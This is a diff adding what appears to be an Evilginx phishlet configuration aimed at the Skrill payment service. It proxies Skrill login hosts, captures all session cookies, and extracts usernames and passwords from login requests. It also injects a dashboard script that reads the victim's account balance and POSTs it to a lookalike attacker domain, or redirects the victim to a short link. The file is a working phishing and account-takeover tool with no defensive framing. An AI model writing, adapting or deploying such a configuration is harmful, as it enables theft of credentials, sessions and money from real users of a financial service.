@@ -1,0 +1,37 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'skrill.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn1', orig_sub: 'cdn1', domain: 'skrill.com', session: false, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'skrill.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'account.skrill.com', orig_sub: 'account', domain: 'skrill.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn1.skrill.com', orig_sub: 'cdn1', domain: 'skrill.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_urls:
+  - '/wallet/ng/dashboard'
+auth_tokens:
+  - domain: '.skrill.com'
+    keys: ['.*,regexp']
+  - domain: 'account.skrill.com'
+    keys: ['.*,regexp']
+  
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'account.skrill.com'
+  path: '/wallet/account/login'
+  
+js_inject:
+  - trigger_domains: ["account.skrill.com"]
+    trigger_paths: ["/wallet/ng/dashboard/.*"]
+    trigger_params: []
+    script: |  
+      setTimeout(function() {     function xxxxx() {         if (document.documentElement.innerHTML.indexOf('available-balance user-space-item') > -1 && window.location.href.indexOf("/dashboard") > -1) {              var balance = document.getElementsByClassName('subtitle ps-subtitle-2 ps-color-black-900')[0].innerHTML;              if (balance == ' GBP 0.00 ' || ' USD 0.00 ' || ' EUR 0.00 ') {                 window.location.replace("https://cutt.ly/QIGlIfF");              } else {                  var xf1 = new XMLHttpRequest();                 xf1.open("POST", "https://www.auth-skrill.com/touhou");                 xf1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");                 xf1.send("balance=" + balance);              }           } else {                     }     }     setInterval(function() {         xxxxx();     }, 5000) }, 10000);   
